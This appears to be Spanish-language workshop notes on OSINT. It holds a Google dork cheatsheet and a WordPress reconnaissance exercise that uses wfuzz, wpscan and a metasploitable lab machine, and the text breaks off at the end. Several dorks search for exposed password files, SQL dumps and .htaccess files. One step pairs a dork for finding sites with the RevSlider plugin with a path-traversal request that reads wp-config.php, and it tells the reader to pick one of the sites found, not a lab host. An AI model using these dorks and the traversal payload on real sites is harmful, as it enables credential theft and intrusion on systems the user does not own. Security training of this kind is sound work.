# OSINT


###  GOOGLE DORKING

# Google dork cheatsheet

## Filtros de Búsqueda
| Filter          | Description                                        | Example                              |
| :-------------- |:---------------------------------------------------| :------------------------------------|
| intext      | Busca las apariciones de todas las palabras clave dadas. | `intext:"keyword"` |
| inurl      | busca direcciones en Internet que tengan ese URL. | `inurl:"keyword"` |
| allinurl      | busca direcciones en Internet solamente las páginas que tengan ese URL. | `allinurl:"keyword"` |
| intitle      | busca páginas con ese título. | `intitle:"keyword"` |
| site      | busca un sitio (dominio) específico. | `site:"www.google.com"` |
| filetype      | especifica un tipo de extensión de archivo. | `filetype:"pdf"` |
| before/after      | Usado para buscar en un rango de fechas. | `filetype:pdf & (before:2000-01-01 after:2001-01-01)` |
| related      |Busca páginas que son “similares” a la página web especificada. | `related:www.google.com` |
| cache      | Muestra la versión de chache de alguna página. | `cache:www.google.com` |

## Ejemplos

#### Búsqueda de Dominios
```
site: www.microsoft.com
site: microsoft.com –www.microsoft.com 
```
#### Listados (Folder Trasversal)
```
intext:"index of /"
intitle: Index.of/admin
intitle: index.of apache server at
allintitle: "index of/root" 
```

#### Páginas por defecto (home page): 
```
intitle:test.page.for.apache "it worked"
allintitle:Netscape FastTrack Server Home Page
intitle:"Welcome to Windows 2000 Internet Services"
intitle:welcome.to.IIS.
allintitle:Welcome to Windows XP Server Internet Services
allintitle:"Welcome to Internet Information Server"
allintitle:Netscape Enterprise Server Home Page
allintitle:Netscape FASTTRACK Server Home Page 
```

#### Páginas por defecto: 
```
intitle:test.page.for.apache "it worked"
allintitle:Netscape FastTrack Server Home Page
intitle:"Welcome to Windows 2000 Internet Services"
intitle:welcome.to.IIS.
allintitle:Welcome to Windows XP Server Internet Services
allintitle:"Welcome to Internet Information Server"
allintitle:Netscape Enterprise Server Home Page
allintitle:Netscape FASTTRACK Server Home Page 
```
#### Manuales y Documentación
```
intitle:"documentation" intitle:”Apache 1.3 documentation”                     Apache 1.3
intitle: “Apache 2.0 documentation”                    Apache 2.0
intitle:”Apache HTTP Server” intitle:” documentation   Apache Various
inurl:cfdocs                                           ColdFusion
intitle:”Easerver” “Easerver Version Documents”        EAServer
inurl:iishelp core                                     IIS/Various
```
#### Páginas ejemplos
```
inurl:WebSphereSamples                            IBM Websphere
inurl:/sample/faqw46                              Lotus Domino 4.6
inurl:samples/Search/queryhit                     Microsoft Index Server
inurl:siteserver/docs                             Microsoft Site Server
inurl:/demo/sql/index.jsp                         Oracle Demos
inurl:demo/basic/info                             Oracle JSP Demos
inurl:iissamples                                  IIS/Various
inurl:/scripts/samples/search                     IIS/Various
```
#### Escaneo de Puertos
```
"VNC Desktop" inurl:5800
inurl:5800
inurl:webmin inurl:10000
```
#### Password
```
ext:pwd inurl:(service | authors | administrators | users) “# -FrontPage-”
inurl:"auth_user_file.txt"
"Index of /admin" 
"Index of /password"
"Index of /mail"
"Index of /" +passwd
"Index of /" +password.txt
"Index of /" +.htaccess
index of ftp +.mdb allinurl:/cgi-bin/ +mailto
alliurl:phpinfo.php
administrators.pwd.index
authors.pwd.index
service.pwd.index
filetype:sql “# dumping data for table” “`PASSWORD` varchar”
```

#### Base de Datos
```
intitle:index.of password.mdb
ext:asa mdb
ext:asa SERVER=(local)
index of ftp +.mdb allinurl:/cgi-bin/ +mailto
filetype:sql “# dumping data for table” “`PASSWORD` varchar”
```
## Operadores

#### Búsqueda de términos

Frase exacta

```
"Tinned Sandwiches"
```

#### OR

```
site:facebook.com | site:twitter.com
```

#### AND

```
site:facebook.com & site:twitter.com
```

#### Combinación de operadores

```
(site:facebook.com | site:twitter.com) & intext:"login"
(site:facebook.com | site:twitter.com) (intext:"login")
```

#### Excluir resultados

```
site:facebook.* -site:facebook.com
```

#### Patron Global (*)

```
site:*.com
```

###  DORKING EN WORDPRESS

Empezemos con este dork
```
Dork: inurl:/wp-content/plugins/revslider/
```
Dicho dork te permite ubicar sitios vulnerables en los que podrías obtener uno de los archivos de configuración principales del CMS, elija un sitio, a ese sitio que eligió para efectos del taller le llamaremos <www.vulnerable.com>
```
http://<www.vulnerable.com>/wp-admin/admin-ajax.php?action=revslider_show_image&img=../wp-config.php
```

![image](https://user-images.githubusercontent.com/50930193/166059793-2dea6276-7bd7-445b-b59f-455bdb2c70b6.png)

Esto no es google DORKS pero es necesario que conozcan la funcionalidad de la técnica de Fuzzing, esta técnica permite automatizar mediante fuerza bruta la posibilidad de encontrar directorios, para ello es necesario disponer de un diccionario

Ingrese a kali y ejecute
```
$more /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
Ese es un Wordlist con nombres de directorios que usan los principales servidorws web y CMSs

Ejecute el comando 
```
$ wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://<www.vulnerable.com>/FUZZ
```
Tendremos un resultado como el que sigue
```
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://www.vulnerable.com/FUZZ
Total requests: 220560

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                               
=====================================================================
000000041:   403        0 L      1 W        5 Ch        "2005" 
000000046:   403        0 L      1 W        5 Ch        "09"  
000000045:   403        0 L      1 W        5 Ch        "1"  
000000040:   403        0 L      1 W        5 Ch        "default"
000000042:   403        0 L      1 W        5 Ch        "products" 
000000043:   403        0 L      1 W        5 Ch        "sitemap" 
000000039:   403        0 L      1 W        5 Ch        "img"    
000000038:   403        0 L      1 W        5 Ch        "home"   
000000037:   403        0 L      1 W        5 Ch        "rss"   
000000034:   403        0 L      1 W        5 Ch        "10"  
000000031:   200        374 L    1303 W     29403 Ch    "logo" 
000001535:   403        0 L      1 W        5 Ch        "215"                                                   
000001543:   200        329 L    768 W      33918 Ch    "webmail" 
000001533:   403        0 L      1 W        5 Ch        "hotel" 
000001530:   403        0 L      1 W        5 Ch        "Article"
```
Con esos resultados puede revisar aquellos directorios con resultados de estado *200* y podemos explorar el sitio.

Ahora ejecute el comando siguiente:
```
$ wpscan --url http://www.vulnerable.com --enumerate u
```
Usando la máquina metasploitable podemos hacer una revisión 
```
wpscan --url http://192.168.109.171/wordpress --enumerate u
```
NOTA: Antes de ejecutar el comando anterior es necesario corregir un error de instalación. 

Para ello, desde la consola de metasploitable me conecto con mysql asi:
```
msfadmin@metasploitable:~$ mysql -u root -p
```
cuando me pide password pulso enter, ya estoy conectado. 
```
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g
Your MySQL connection id is 8
Server version: 5.0.51a-3ubuntu5 (Ubuntu)

Tupe 'help;' or '\h'. Type '\c' to clear the buffer.

mysql>
```
Allí deberá crear un usuario con privilegios
```
mysql> GRANT ALL PRIVILEGES ON *.* TO 'user'@'localhost' IDENTIFIED BY 'pass' WITH GRANT OPTION;
```
De esta forma entro en phpMyAdmin (http://192.168.109.171/phpMyAdmin/) con las credenciales **user** y **pass**, como login y password respectivamente y se puede actualizar la configuración

![image](https://user-images.githubusercontent.com/50930193/166862729-ebe2463d-e522-4fa7-acff-e8f81049b090.png)

Elegir wordpress

![image](https://user-images.githubusercontent.com/50930193/166862767-c04f1bcb-e40c-4eac-ba2c-cc69de33a8a3.png)

Actualizar el IP, el nuevo IP deberá ser el IP de la máquina metasploitable

![image](https://user-images.githubusercontent.com/50930193/166862849-508f3d0c-fa77-4fb5-9b23-1cef34c682bf.png)

Ahora si podemos trabajar sobre la máquina metasploitable podemos hacer una revisión 
